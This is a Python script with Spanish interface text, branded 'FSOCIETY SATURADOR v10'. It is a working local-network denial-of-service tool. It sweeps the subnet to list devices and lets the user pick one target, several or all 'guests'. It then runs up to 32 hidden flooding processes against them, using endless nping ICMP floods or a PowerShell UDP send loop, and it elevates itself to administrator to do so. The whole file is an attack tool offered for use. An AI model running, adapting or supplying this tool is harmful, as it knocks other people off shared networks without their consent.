#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=========================================================================
  F S O C I E T Y   ·   S A T U R A D O R   v10
  Inyeccion v8 (congela el internet) · 32 procesos · escaneo limpio
  AHORA: ataca VARIOS dispositivos a la vez (tumba la red rapido).
=========================================================================
  COMO SE USA (en este orden):
    1) Abre como Administrador.
    2) Pulsa  d  ->  escaneo limpio y numerado.
       Elige UNO (3) o VARIOS (1,3,5  ·  1-6  ·  todos  ·  invitados).
    3) O pulsa  a  y escribe las IPs separadas por comas.
    4) Pulsa  s  para parar (cierra TODO),  r  para restaurar la red.

  Teclas:
    a) atacar IP(s)   t) cambiar objetivo   p) potencia
    s) PARAR   r) RESTAURAR   w) vigilar   d) escanear   q) salir
=========================================================================
"""

import os
import re
import sys
import time
import atexit
import signal
import shutil
import socket
import platform
import subprocess
from concurrent.futures import ThreadPoolExecutor

IS_WIN = platform.system() == "Windows"
CREATE_NO_WINDOW = 0x08000000
CREATE_NEW_PROCESS_GROUP = 0x00000200
DEVNULL = subprocess.DEVNULL

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_DIR = os.path.join(BASE_DIR, "logs")
os.makedirs(LOG_DIR, exist_ok=True)

ATTACKS = {}
TARGETS = []               # lista de objetivos (1 o varios)
GATEWAY = None
LOCAL_IP = None
IFACE = None
WIFI = {}
INTERNET = "8.8.8.8"

POWER_OPTS = [8, 16, 24, 32]
POWER = 32                 # 32 procesos: maxima efectividad
PAYLOAD = 1400             # tamano de la inyeccion v8 (la que congela)
MARK = "SATURADORv10"      # marca unica: reconoce SOLO nuestros procesos


class C:
    RST = "\033[0m"; BLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[91m"; GRN = "\033[92m"; YEL = "\033[93m"
    BLU = "\033[94m"; MAG = "\033[95m"; CYA = "\033[96m"; WHT = "\033[97m"


def enable_ansi():
    if IS_WIN:
        try:
            import ctypes
            k = ctypes.windll.kernel32
            k.SetConsoleMode(k.GetStdHandle(-11), 7)
        except Exception:
            pass


def clear():
    os.system("cls" if IS_WIN else "clear")


def is_admin():
    if IS_WIN:
        try:
            import ctypes
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False
    try:
        return os.geteuid() == 0
    except Exception:
        return False


def maybe_elevate():
    if IS_WIN and not is_admin():
        try:
            import ctypes
            r = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable,
                '"%s"' % os.path.abspath(__file__), None, 1)
            if r > 32:
                print("Abriendo ventana como Administrador...")
                time.sleep(1.0)
                sys.exit(0)
        except Exception:
            pass


def tool(name):
    return shutil.which(name)


def ps(cmd, timeout=10):
    try:
        return subprocess.run(["powershell", "-NoProfile", "-Command", cmd],
                              capture_output=True, text=True, errors="ignore",
                              timeout=timeout).stdout.strip()
    except Exception:
        return ""


# ----------------------------------------------------------------------
def detect_gateway():
    if IS_WIN:
        try:
            out = subprocess.run(["ipconfig"], capture_output=True, text=True,
                                 errors="ignore", timeout=6).stdout
        except Exception:
            return None
        pat = re.compile(r"(?:Puerta de enlace predeterminada|Default Gateway)"
                         r"[\s.]*:[\s]*([0-9]{1,3}(?:\.[0-9]{1,3}){3})", re.I)
        for ip in pat.findall(out):
            if ip != "0.0.0.0":
                return ip
    else:
        for cmd in (["ip", "route", "show", "default"], ["ip", "route", "get", "1.1.1.1"]):
            try:
                out = subprocess.run(cmd, capture_output=True, text=True,
                                     errors="ignore", timeout=6).stdout
            except Exception:
                continue
            m = re.search(r"(?:default via|gateway:)\s*([0-9.]+)", out)
            if m:
                return m.group(1)
    return None


def detect_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("1.1.1.1", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


def wifi_banda():
    if not IS_WIN:
        return {}
    try:
        out = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True,
                             text=True, errors="ignore", timeout=8).stdout
    except Exception:
        return {}

    def grab(pat):
        m = re.search(pat, out, re.I | re.M)
        return m.group(1).strip() if m else None

    ssid = grab(r"^\s*SSID\s*:\s*(.+)$")
    ch = grab(r"(?:Canal|Channel)\s*:\s*(\d+)")
    banda = None
    try:
        c = int(ch) if ch else None
        if c is not None:
            banda = "2.4 GHz" if c <= 14 else ("6 GHz" if c > 200 else "5 GHz")
    except Exception:
        pass
    return {"ssid": ssid, "canal": ch, "banda": banda}


# ----------------------------------------------------------------------
def ps_udp_cmd(target, port, size=PAYLOAD):
    # $M deja la marca en la linea de comandos -> luego la encontramos y la matamos
    script = ("$M='%s';" % MARK +
              "$u=New-Object System.Net.Sockets.UdpClient;"
              "$u.Connect('%s',%d);"
              "$b=New-Object byte[] %d;"
              "$u.Send($b,$b.Length);"
              "while($true){$u.Send($b,$b.Length)}" % (target, port, size))
    return ["powershell", "-NoProfile", "-Command", script]


def flood_cmd(target, i):
    # === INYECCION v8 EXACTA: ICMP puro con nping (la que congela) ===
    if tool("nping"):
        return ["nping", "--icmp", "--data-length", str(PAYLOAD), "--delay", "0",
                "-c", "0", "-H", "-N", target]
    return ps_udp_cmd(target, 40000 + i, PAYLOAD)


def popen(cmd):
    kw = {}
    if IS_WIN:
        kw["creationflags"] = CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP
    else:
        kw["start_new_session"] = True
    return subprocess.Popen(cmd, stdout=DEVNULL, stderr=DEVNULL, **kw)


def kill_proc(proc):
    if proc is None or proc.poll() is not None:
        return
    if IS_WIN:
        subprocess.run(["taskkill", "/F", "/T", "/PID", str(proc.pid)], capture_output=True)
    else:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass


def _pids_marca():
    """PIDs de powershell.exe lanzados por ESTE codigo (por la marca)."""
    if not IS_WIN:
        return []
    out = ps("Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" "
             "| Where-Object { $_.CommandLine -like '*%s*' } "
             "| Select-Object -ExpandProperty ProcessId" % MARK, timeout=8)
    return [int(x) for x in out.split() if x.strip().isdigit()]


def stop_all():
    muertos = set()

    # a) procesos que tenemos fichados
    for proc in list(ATTACKS.values()):
        if proc is not None and proc.poll() is None:
            muertos.add(proc.pid)
        kill_proc(proc)
    ATTACKS.clear()

    if IS_WIN:
        # b) cualquier PowerShell NUESTRO que quedara suelto (marca)
        muertos.update(_pids_marca())
        # c) matarlos a todos junto con sus hijos
        for pid in muertos:
            try:
                subprocess.run(["taskkill", "/F", "/T", "/PID", str(pid)],
                               capture_output=True, timeout=6)
            except Exception:
                pass
        # d) nping sueltos por nombre de imagen (todos son nuestros)
        try:
            subprocess.run(["taskkill", "/F", "/T", "/IM", "nping.exe"],
                           capture_output=True, timeout=8)
        except Exception:
            pass
    else:
        for pid in muertos:
            try:
                os.kill(pid, signal.SIGKILL)
            except Exception:
                pass
        subprocess.run(["pkill", "-f", MARK], capture_output=True)
        subprocess.run(["pkill", "-x", "nping"], capture_output=True)

    return len(muertos)


def vivos():
    return sum(1 for p in ATTACKS.values() if p.poll() is None)


def ping_once(host, timeout=1):
    if IS_WIN:
        cmd = ["ping", "-n", "1", "-w", str(int(timeout * 1000)), host]
    else:
        cmd = ["ping", "-c", "1", "-W", str(int(timeout)), host]
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, errors="ignore",
                             timeout=timeout + 1).stdout
    except Exception:
        return None
    m = re.search(r"(?:time|tiempo)\s*[=<]\s*([0-9]+(?:[.,][0-9]+)?)", out, re.I)
    return float(m.group(1).replace(",", ".")) if m else None


def obj_label():
    if not TARGETS:
        return "—"
    if len(TARGETS) == 1:
        return TARGETS[0]
    return "%d dispositivos" % len(TARGETS)


# ----------------------------------------------------------------------
def atacar(targets):
    """Ataca UNO o VARIOS objetivos. Reparte los procesos entre ellos."""
    global TARGETS
    if isinstance(targets, str):
        targets = [targets]
    targets = [t.strip() for t in targets if t and t.strip()]
    stop_all()
    TARGETS = list(targets)
    if not TARGETS:
        return

    n = len(TARGETS)
    per = max(1, POWER // n)
    for idx, t in enumerate(TARGETS):
        for i in range(per):
            try:
                ATTACKS["%d_%d" % (idx + 1, i + 1)] = popen(flood_cmd(t, i))
            except Exception:
                pass

    time.sleep(0.9)
    v = vivos()
    clear()
    if v == 0:
        print(f"  {C.RED}No arranco ningun proceso contra {obj_label()}.{C.RST}")
        print(f"  {C.DIM}En esa PC falta nping y PowerShell tambien fallo.{C.RST}")
    else:
        if n == 1:
            print(f"  {C.RED}{C.BLD}ATACANDO {TARGETS[0]}  con {v} procesos{C.RST}")
        else:
            print(f"  {C.RED}{C.BLD}ATACANDO {n} DISPOSITIVOS  con {v} procesos "
                  f"({per} por equipo){C.RST}")
            for t in TARGETS:
                print(f"    {C.DIM}·{C.RST} {C.CYA}{t}{C.RST}")
        print(f"\n  {C.DIM}Pulsa 'w' para ver la latencia.  's' para parar.{C.RST}")
    time.sleep(1.3)


def comando_atacar():
    clear()
    print(f"{C.RED}{C.BLD}  ATACAR{C.RST}\n")
    print(f"  Objetivo actual : {C.YEL}{obj_label()}{C.RST}")
    print(f"  {C.DIM}Varias IPs: separalas con comas  ->  192.168.1.5, 192.168.1.7{C.RST}")
    print(f"  {C.DIM}Enter = atacar el objetivo actual.   'd' = escanear.{C.RST}\n")
    txt = input("  IP(s) a atacar: ").strip()
    if not txt:
        if not TARGETS:
            print(f"\n  {C.YEL}No hay objetivo. Pulsa 'd' para escanear.{C.RST}")
            time.sleep(1.2)
            return
        atacar(list(TARGETS))
        return
    ips = [p for p in re.split(r"[,\s]+", txt) if p]
    atacar(ips)


def cambiar_objetivo():
    global TARGETS
    clear()
    print(f"{C.RED}{C.BLD}  CAMBIAR OBJETIVO{C.RST}\n")
    print(f"  Actual : {C.YEL}{obj_label()}{C.RST}")
    print(f"  Tu IP  : {LOCAL_IP}      Router : {GATEWAY}\n")
    txt = input("  Nueva IP(s): ").strip()
    if not txt:
        return
    ips = [p for p in re.split(r"[,\s]+", txt) if p]
    estaba = vivos() > 0
    if estaba:
        atacar(ips)
    else:
        TARGETS = ips
        print(f"\n  {C.GRN}Objetivo = {obj_label()}{C.RST}")
        time.sleep(1)


def cambiar_potencia():
    global POWER
    POWER = POWER_OPTS[(POWER_OPTS.index(POWER) + 1) % len(POWER_OPTS)]
    print(f"\n  {C.MAG}Potencia = {POWER} procesos{C.RST}")
    time.sleep(0.8)


def restore():
    clear()
    print(f"{C.YEL}>> PARANDO TODO Y RESTAURANDO...{C.RST}")
    print(f"   {stop_all()} tarea(s) cerrada(s)")
    time.sleep(0.5)
    if IS_WIN:
        subprocess.run(["arp", "-d", "*"], capture_output=True)
        subprocess.run(["ipconfig", "/flushdns"], capture_output=True)
    for host in ([TARGETS[0]] if TARGETS else []) + [INTERNET]:
        lat = ping_once(host, timeout=1)
        print(f"   {host:<16} " + (f"{lat:.0f} ms" if lat is not None else "sin respuesta"))
    print(f"\n{C.GRN}   RED LIBRE.{C.RST}")
    input(f"\n{C.DIM}Enter para volver...{C.RST}")


def watch(host):
    clear()
    print(f"{C.CYA}Vigilando {host}  -  Ctrl+C para volver{C.RST}\n")
    try:
        while True:
            lat = ping_once(host, timeout=1)
            if lat is None:
                print(f"\r{C.RED}  SIN RESPUESTA   {C.RST} {'!' * 40}", end="", flush=True)
            else:
                col = C.GRN if lat < 30 else (C.YEL if lat < 100 else C.RED)
                print(f"\r{col}{lat:7.1f} ms {C.RST} {'#' * min(40, int(lat / 10)):<40}",
                      end="", flush=True)
            time.sleep(0.3)
    except KeyboardInterrupt:
        print()
    input(f"{C.DIM}Enter para volver...{C.RST}")


# ----------------------- ESCANEO LIMPIO -------------------------------
_IP_RE = re.compile(r"([0-9]{1,3}(?:\.[0-9]{1,3}){3})")
_MAC_RE = re.compile(r"([0-9a-fA-F]{2}(?:[-:][0-9a-fA-F]{2}){5})")

# pequena tabla de fabricantes conocidos (prefijos OUI)
_OUI = {
    "b8:27:eb": "RaspberryPi", "dc:a6:32": "RaspberryPi", "e4:5f:01": "RaspberryPi",
    "24:0a:c4": "ESP", "3c:71:bf": "ESP", "84:0d:8e": "ESP", "a4:cf:12": "ESP",
    "50:c7:bf": "TP-Link", "a4:2b:b0": "TP-Link", "b0:4e:26": "TP-Link",
    "64:09:80": "Xiaomi", "78:11:dc": "Xiaomi", "f8:a4:5f": "Xiaomi",
}


def _subnet_prefix():
    try:
        return LOCAL_IP.rsplit(".", 1)[0]
    except Exception:
        return "192.168.1"


def _ping_worker(par):
    host, to = par
    ping_once(host, timeout=to)
    return host


def ping_sweep(timeout=0.4):
    """Barrido real: descubre equipos que 'arp -a' solo no ve."""
    prefix = _subnet_prefix()
    hosts = ["%s.%d" % (prefix, n) for n in range(1, 255)]
    with ThreadPoolExecutor(max_workers=64) as ex:
        list(ex.map(_ping_worker, [(h, timeout) for h in hosts]))


def leer_arp():
    """Lee la tabla ARP y limpia la basura (broadcast / multicast / vacios)."""
    try:
        out = subprocess.run(["arp", "-a"], capture_output=True, text=True,
                             errors="ignore", timeout=15).stdout
    except Exception:
        return {}
    res = {}
    for line in out.splitlines():
        mi = _IP_RE.search(line)
        mm = _MAC_RE.search(line)
        if not mi or not mm:
            continue
        ip = mi.group(1)
        mac = mm.group(1).replace("-", ":").lower()
        # filtrar basura
        if ip.startswith(("224.", "239.", "255.")) or ip.endswith(".255"):
            continue
        if mac in ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"):
            continue
        if mac.startswith(("01:00:5e", "33:33", "01:80:c2")):
            continue
        res[ip] = mac
    return res


def _fab(mac):
    return _OUI.get(mac[:8], "")


def resolver(sel, equipos):
    """Convierte la seleccion del usuario en una lista de IPs.
    Acepta:  3   ·   1,3,5   ·   1-6   ·   todos   ·   invitados   ·   IPs."""
    sel = sel.strip().lower()
    if not sel:
        return []
    if sel in ("*", "all", "todo", "todos", "t"):
        return [ip for _s, ip, _m in equipos]
    if sel in ("invitados", "gente", "clientes", "g"):
        return [ip for _s, ip, _m in equipos if ip not in (GATEWAY, LOCAL_IP)]

    out = []
    for part in re.split(r"[,\s]+", sel):
        if not part:
            continue
        if part.isdigit():
            k = int(part)
            if 1 <= k <= len(equipos):
                out.append(equipos[k - 1][1])
        elif re.fullmatch(r"\d+-\d+", part):
            a, b = part.split("-")
            for k in range(int(a), int(b) + 1):
                if 1 <= k <= len(equipos):
                    out.append(equipos[k - 1][1])
        elif _IP_RE.fullmatch(part):
            out.append(part)

    # quitar repetidos conservando el orden
    res, visto = [], set()
    for ip in out:
        if ip not in visto:
            visto.add(ip)
            res.append(ip)
    return res


def scan():
    clear()
    print(f"{C.RED}{C.BLD}  ESCANEO DE RED{C.RST}")
    print(f"  {C.DIM}barriendo {_subnet_prefix()}.x  (unos segundos)...{C.RST}\n")
    ping_sweep()
    time.sleep(0.6)                      # deja que se llene la tabla ARP
    tabla = leer_arp()
    prefix = _subnet_prefix()
    equipos = []
    for ip, mac in tabla.items():
        if ip.rsplit(".", 1)[0] != prefix:
            continue
        equipos.append((tuple(int(x) for x in ip.split(".")), ip, mac))
    equipos.sort()

    if not equipos:
        print(f"  {C.YEL}No se encontro ningun equipo.{C.RST}")
        print(f"  {C.DIM}Comprueba que estas como Administrador y conectado al WiFi.{C.RST}")
        input(f"\n{C.DIM}Enter para volver...{C.RST}")
        return

    print(f"  {C.GRN}{len(equipos)} equipo(s) encontrados en {prefix}.x{C.RST}\n")
    print(f"  {C.DIM}{'#':>3}  {'IP':<16} {'MAC':<18} {'FABRICANTE':<12}{C.RST}")
    print(f"  {C.DIM}{'─' * 55}{C.RST}")
    for n, (_sk, ip, mac) in enumerate(equipos, 1):
        tag = ""
        if ip == GATEWAY:
            tag = f" {C.YEL}[ROUTER]{C.RST}"
        elif ip == LOCAL_IP:
            tag = f" {C.GRN}[TU]{C.RST}"
        print(f"  {n:>3}  {C.CYA}{ip:<16}{C.RST} {mac:<18} {_fab(mac):<12}{tag}")

    print(f"\n  {C.DIM}Elige UNO  ->  3     ·     VARIOS  ->  1,3,5   ó   1-6{C.RST}")
    print(f"  {C.DIM}Atajos:  todos  ·  invitados{C.RST}")
    sel = input(f"\n  {C.BLD}Seleccion{C.RST} (Enter = volver): ").strip()
    if not sel:
        return
    elegidos = resolver(sel, equipos)
    if not elegidos:
        print(f"\n  {C.YEL}Seleccion no valida.{C.RST}")
        time.sleep(1.1)
        return
    atacar(elegidos)


# ----------------------------------------------------------------------
def show_menu():
    clear()
    b = wifi_banda()

    inner = 62
    titulo = "F S O C I E T Y   ·   S A T U R A D O R   v 1 0"
    print(f"  {C.RED}╔{'═' * inner}╗{C.RST}")
    print(f"  {C.RED}║{C.RST}{C.WHT}{C.BLD}{titulo.center(inner)}{C.RST}{C.RED}║{C.RST}")
    print(f"  {C.RED}╚{'═' * inner}╝{C.RST}")
    print()

    print(f"   {C.DIM}TU IP     {C.RST}{C.CYA}{LOCAL_IP}{C.RST}")
    if b.get("banda"):
        print(f"   {C.DIM}WIFI      {C.RST}{C.CYA}{b.get('ssid')}{C.RST}"
              f" {C.DIM}· {b['banda']} · canal {b.get('canal')}{C.RST}")

    if not TARGETS:
        obj = f"{C.DIM}— (pulsa 'd' para escanear){C.RST}"
    elif len(TARGETS) == 1:
        obj = f"{C.YEL}{TARGETS[0]}{C.RST}"
    else:
        extra = ", ".join(TARGETS[:3]) + ("…" if len(TARGETS) > 3 else "")
        obj = f"{C.YEL}{len(TARGETS)} dispositivos{C.RST} {C.DIM}({extra}){C.RST}"
    print(f"   {C.DIM}OBJETIVO  {C.RST}{obj}")

    print(f"   {C.DIM}POTENCIA  {C.RST}{C.CYA}{POWER} procesos{C.RST}"
          f" {C.DIM}· payload {PAYLOAD} B{C.RST}")

    ref = TARGETS[0] if TARGETS else GATEWAY
    lat = ping_once(ref, timeout=1)
    wan = ping_once(INTERNET, timeout=1)
    print(f"   {C.DIM}LATENCIA  {C.RST}objetivo "
          f"{('%.0f ms' % lat) if lat else 'sin resp.'}   "
          f"{C.DIM}internet{C.RST} {('%.0f ms' % wan) if wan else 'sin resp.'}")

    v = vivos()
    if v:
        estado = f"{C.RED}● {v} procesos atacando{C.RST}"
    else:
        estado = f"{C.DIM}○ en espera{C.RST}"
    print(f"   {C.DIM}ESTADO    {C.RST}{estado}")

    admin = f"{C.GRN}admin{C.RST}" if is_admin() else f"{C.RED}NO - abre como Administrador{C.RST}"
    print(f"   {C.DIM}PERMISOS  {C.RST}{admin}")

    print()
    print(f"   {C.WHT}{C.BLD}ACCIONES{C.RST}")
    print(f"     {C.RED}[A]{C.RST} Atacar IP(s)          {C.RED}[D]{C.RST} Escanear red")
    print(f"     {C.RED}[T]{C.RST} Cambiar objetivo      {C.RED}[W]{C.RST} Vigilar latencia")
    print(f"     {C.RED}[P]{C.RST} Potencia ({POWER})         {C.RED}[S]{C.RST} Parar")
    print(f"     {C.RED}[R]{C.RST} Restaurar red         {C.RED}[Q]{C.RST} Salir")


def main():
    global GATEWAY, LOCAL_IP, IFACE
    enable_ansi()
    maybe_elevate()
    atexit.register(stop_all)
    GATEWAY = detect_gateway() or "192.168.1.1"
    LOCAL_IP = detect_local_ip()

    while True:
        show_menu()
        try:
            op = input(f"\n  {C.RED}{C.BLD}>{C.RST} ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            break
        try:
            if op in ("", "a"):
                comando_atacar()
            elif op == "q":
                break
            elif op == "s":
                n = stop_all()
                print(f"\n  {C.RED}PARADO. {n} tarea(s) cerrada(s) (nping + powershell).{C.RST}")
                time.sleep(0.9)
            elif op == "r":
                restore()
            elif op == "w":
                watch(TARGETS[0] if TARGETS else GATEWAY)
            elif op == "d":
                scan()
            elif op == "t":
                cambiar_objetivo()
            elif op == "p":
                cambiar_potencia()
        except KeyboardInterrupt:
            print(f"\n  {C.YEL}Ctrl+C -> parando...{C.RST}")
            stop_all()

    stop_all()
    print(f"\n{C.RED}fsociety{C.RST} · Todo detenido. Chao.")


if __name__ == "__main__":
    main()